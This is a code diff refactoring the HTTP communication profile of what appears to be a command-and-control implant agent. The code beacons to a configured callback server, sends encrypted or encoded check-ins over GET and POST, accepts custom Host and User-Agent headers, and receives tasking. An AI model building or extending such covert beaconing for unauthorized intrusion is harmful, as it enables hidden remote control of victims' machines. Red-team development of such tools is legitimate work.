@@ -29,48 +29,56 @@ namespace Agent.Profiles
 
         public HttpProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
         {
-            HttpClientHandler handler = new HttpClientHandler();
             this.agentConfig = config;
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            var opts = JsonSerializer.Deserialize(
-                ChannelConfig.Decode(),
-                HttpChannelOptionsJsonContext.Default.HttpChannelOptions)
-                ?? throw new InvalidOperationException("Invalid HTTP profile configuration");
-            int callbackPort = opts.CallbackPort;
-            string callbackHost = opts.CallbackHost;
-            string getUri = opts.GetUri;
-            string queryPath = opts.QueryPathName;
-            string postUri = opts.PostUri;
+            HttpChannelOptions? opts = null;
+            try
+            {
+                opts = JsonSerializer.Deserialize(
+                    ChannelConfig.Decode(),
+                    HttpChannelOptionsJsonContext.Default.HttpChannelOptions);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Failed to deserialize HTTP channel options: {ex.Message}");
+            }
+            opts ??= new HttpChannelOptions();
+
+            string baseUrl = $"{opts.CallbackHost.TrimEnd('/')}:{opts.CallbackPort}";
             this.userAgent = opts.Headers.GetValueOrDefault("User-Agent", "");
             this.hostHeader = opts.Headers.GetValueOrDefault("Host", "");
-            this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
-            this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
+            this.getURL = $"{baseUrl}/{opts.GetUri}?{opts.QueryPathName}=";
+            this.postURL = $"{baseUrl}/{opts.PostUri}";
             this.proxyHost = string.IsNullOrEmpty(opts.ProxyPort)
                 ? opts.ProxyHost
                 : $"{opts.ProxyHost}:{opts.ProxyPort}";
             this.proxyPass = opts.ProxyPass;
             this.proxyUser = opts.ProxyUser;
 
+            var handler = new HttpClientHandler();
+            ConfigureProxy(handler);
+            this._client = new HttpClient(handler);
+            ConfigureRequestHeaders(opts.Headers);
+        }
 
-
-            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
+        private void ConfigureProxy(HttpClientHandler handler)
+        {
+            if (string.IsNullOrEmpty(this.proxyHost) || this.proxyHost == ":")
             {
-                WebProxy wp = new WebProxy()
-                {
-                    Address = new Uri(this.proxyHost)
-                };
-
-                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
-                {
-                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
-                }
-                handler.Proxy = wp;
+                return;
             }
 
-            this._client = new HttpClient(handler);
+            handler.Proxy = new WebProxy { Address = new Uri(this.proxyHost) };
+            if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
+            {
+                handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
+            }
+        }
 
+        private void ConfigureRequestHeaders(Dictionary<string, string> headers)
+        {
             if (!string.IsNullOrEmpty(this.hostHeader))
             {
                 this._client.DefaultRequestHeaders.Host = this.hostHeader;
@@ -81,40 +89,23 @@ namespace Agent.Profiles
                 this._client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
             }
 
-            foreach (var header in opts.Headers)
+            foreach (var header in headers.Where(h => h.Key != "User-Agent" && h.Key != "Host"))
             {
-                if (header.Key != "User-Agent" && header.Key != "Host")
-                {
-                    this._client.DefaultRequestHeaders.Add(header.Key, header.Value);
-                }
+                this._client.DefaultRequestHeaders.Add(header.Key, header.Value);
             }
         }
 
-
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
-            int maxAttempts = 3;
-            int currentAttempt = 0;
-            do
+            const int maxCheckinAttempts = 3;
+            for (int attempt = 0; attempt <= maxCheckinAttempts; attempt++)
             {
                 string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
-
-                if (!string.IsNullOrEmpty(res))
+                if (TryParseCheckinResponse(res, out CheckinResponse? response))
                 {
-                    try
-                    {
-                        CheckinResponse? response = JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
-                        if (CheckinResponseValidation.IsSuccessful(response))
-                        {
-                            return response!;
-                        }
-                    }
-                    catch (JsonException)
-                    {
-                    }
+                    return response!;
                 }
-                currentAttempt++;
-            } while (currentAttempt <= maxAttempts);
+            }
 
             return new CheckinResponse()
             {
@@ -140,7 +131,7 @@ namespace Agent.Profiles
                     bool delivered = await DeliverBeaconOnce();
                     this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
                     this.currentAttempt++;
                 }
@@ -165,6 +156,30 @@ namespace Agent.Profiles
 
             this.SetTaskingReceived?.Invoke(null, new TaskingReceivedArgs(tasking));
             return true;
+        }
+
+        private static bool TryParseCheckinResponse(string response, out CheckinResponse? checkinResponse)
+        {
+            checkinResponse = null;
+            if (string.IsNullOrEmpty(response))
+            {
+                return false;
+            }
+
+            try
+            {
+                CheckinResponse? parsed = JsonSerializer.Deserialize(response, CheckinResponseJsonContext.Default.CheckinResponse);
+                if (!CheckinResponseValidation.IsSuccessful(parsed))
+                {
+                    return false;
+                }
+                checkinResponse = parsed;
+                return true;
+            }
+            catch (JsonException)
+            {
+                return false;
+            }
         }
 
         private static bool TryParseTasking(string response, out GetTaskingResponse? tasking)
@@ -194,29 +209,28 @@ namespace Agent.Profiles
         internal async Task<string> Send(string json)
         {
             //This will encrypted if AES is selected or just Base64 encode if None is referenced.
-                json = this.crypt.Encrypt(json);
+            json = this.crypt.Encrypt(json);
 
-                HttpResponseMessage response;
-
-                if (json.Length < 2000) //Max URL length
+            HttpResponseMessage response;
+            if (json.Length < 2000) //Max URL length
+            {
+                // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
+                if (json.EndsWith("=="))
                 {
-                    // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
-                    if (json.EndsWith("=="))
-                    {
-                        json = json.Substring(0, json.Length - 2) + "%3D%3D";
-                    }
-                    response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
+                    json = json[..^2] + "%3D%3D";
                 }
-                else
-                {
-                    response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
-                }
+                response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
+            }
+            else
+            {
+                response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
+            }
 
-                response.EnsureSuccessStatusCode();
-                string strRes = await response.Content.ReadAsStringAsync();
+            response.EnsureSuccessStatusCode();
+            string strRes = await response.Content.ReadAsStringAsync();
 
-                //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
-                return this.crypt.Decrypt(strRes);
+            //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
+            return this.crypt.Decrypt(strRes);
         }
 
         public bool StopBeacon()
